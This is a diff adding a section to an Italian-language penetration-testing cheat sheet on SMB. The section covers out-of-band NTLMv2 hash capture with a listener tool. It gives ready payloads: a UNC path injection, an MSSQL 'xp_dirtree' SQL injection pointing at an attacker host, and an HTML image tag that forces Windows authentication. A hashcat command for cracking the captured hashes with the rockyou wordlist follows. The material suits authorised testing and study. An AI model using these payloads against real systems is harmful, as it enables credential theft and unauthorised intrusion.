@@ -245,6 +245,41 @@ nxc smb <IP> -u 'admin' -p 'pass' --disks             # Dischi disponibili
 smbstatus                                              # Chi è connesso, versione protocollo, file lockati
 ```
 
+## OOB con catch
+
+Cattura hash NTLMv2 quando un target Windows tenta l'autenticazione automatica via UNC path.
+
+```bash
+# Avvia il SMB listener
+catch smb on [--port 445]
+```
+
+### Cattura hash NTLMv2
+
+Windows tenta automaticamente l'autenticazione NTLM verso qualsiasi UNC path:
+
+```bash
+# UNC path injection (form, SSRF, path traversal):
+\\<LHOST>\x\test
+
+# In una SQL injection (MSSQL):
+'; EXEC master..xp_dirtree '\\<LHOST>\x'--
+
+# In un file HTML/email (forced authentication):
+<img src="\\<LHOST>\x\image.png">
+```
+
+Nel log di `catch logs smb` vedi l'hash NTLMv2 in formato hashcat:
+```
+user::DOMAIN:challenge:ntproof:blob
+```
+
+Gli hash vengono salvati anche in `loot/ntlmv2_hashes.txt`. Cracka con:
+
+```bash
+hashcat -m 5600 loot/ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
 ---
 
 ## Tool consigliati
